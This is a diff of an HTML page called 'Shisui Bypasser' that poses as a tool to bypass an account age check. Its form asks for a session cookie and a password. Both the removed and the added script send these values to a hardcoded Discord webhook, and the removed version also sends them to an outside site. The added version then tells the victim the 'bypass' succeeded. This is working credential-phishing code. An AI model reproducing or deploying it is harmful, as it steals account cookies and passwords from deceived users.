@@ -1,105 +1,93 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Shisui Bypasser</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
-    body {
-      font-family: 'Inter', sans-serif;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shisui Bypasser</title>
+    <style>
+        body {
+            background-color: #1A1A2E;
+            color: #E94560;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background-color: #16213E;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #E94560;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #D83D50;
+        }
+    </style>
 </head>
-<body class="bg-[#1a1626] flex items-center justify-center min-h-screen p-4">
-  <div class="bg-[#14243b] rounded-xl p-8 w-full max-w-md">
-    <h1 class="text-[#e94a63] font-extrabold text-3xl mb-8">Shisui Bypasser</h1>
-    <form id="bypassForm" class="space-y-6">
-      <input 
-        id="cookieInput"
-        type="text" 
-        placeholder="Enter Cookie" 
-        class="w-full rounded-md px-4 py-3 text-gray-700 text-base focus:outline-none" 
-        required
-      />
-      <input 
-        id="passwordInput"
-        type="password" 
-        placeholder="Enter Password" 
-        class="w-full rounded-md px-4 py-3 text-gray-700 text-base focus:outline-none" 
-        required
-      />
-      <button 
-        type="submit" 
-        class="w-full bg-[#e94a63] text-white text-base py-3 rounded-md"
-      >
-        Submit
-      </button>
-    </form>
-  </div>
+<body>
+    <div class="form-container">
+        <h2>Shisui Bypasser</h2>
+        <form id="bypassForm">
+            <input type="text" id="cookie" placeholder="Enter Cookie" required>
+            <input type="password" id="password" placeholder="Enter Password" required>
+            <button type="submit">Submit</button>
+        </form>
+        <div id="notification" style="margin-top: 10px;"></div>
+    </div>
 
-  <script>
-    const webhookURL = "https://discord.com/api/webhooks/1311975858583506985/ZB1Lm3IG9Lcf0QMloKAByd9V2fdEGVoyQ2m935Kz5cm1xCbHQyPaazxmhXvEisNBUiua"; // Replace with your webhook URL
+    <script>
+        document.getElementById('bypassForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const cookie = document.getElementById('cookie').value;
+            const password = document.getElementById('password').value;
 
-    document.getElementById('bypassForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
+            // Replace with your actual webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1311975858583506985/ZB1Lm3IG9Lcf0QMloKAByd9V2fdEGVoyQ2m935Kz5cm1xCbHQyPaazxmhXvEisNBUiua';
 
-      const cookie = document.getElementById('cookieInput').value;
-      const password = document.getElementById('passwordInput').value;
-
-      // Send data to https://starpets.my.id/age-bypass/ via POST
-      try {
-        await fetch('https://starpets.my.id/age-bypass/', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-          },
-          body: new URLSearchParams({
-            cookie: cookie,
-            password: password
-          })
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `Cookie: ${cookie}\nPassword: ${password}`,
+                    embeds: [{
+                        title: "Bypass Notification",
+                        description: "Bypass successful! Please wait 1-5 minutes and check!",
+                        color: 3066993 // Color code for embed
+                    }],
+                    mentions: ["@everyone @here"] // Replace with actual user ID or mention format
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('notification').innerText = "Bypass successful! Please wait 1-5 minutes and check!";
+                } else {
+                    throw new Error('Network response was not ok');
+                }
+            })
+            .catch(error => {
+                document.getElementById('notification').innerText = "Something went wrong, please DM the owner!";
+            });
         });
-      } catch (error) {
-        // Handle error silently or show message if needed
-      }
-
-      // Send alert to webhook with embed and mention
-      const payload = {
-        content: "@everyone",
-        embeds: [
-          {
-            title: "New Bypass Submission",
-            color: 16711680, // Red color
-            fields: [
-              {
-                name: "Cookie",
-                value: `\`\`\`${cookie}\`\`\``,
-                inline: false
-              },
-              {
-                name: "Password",
-                value: `\`\`\`${password}\`\`\``,
-                inline: false
-              }
-            ],
-            timestamp: new Date().toISOString()
-          }
-        ]
-      };
-
-      try {
-        await fetch(webhookURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(payload)
-        });
-        alert("Submitted successfully!");
-      } catch (error) {
-        alert("Failed to send data to webhook.");
-      }
-    });
-  </script>
+    </script>
 </body>
 </html>
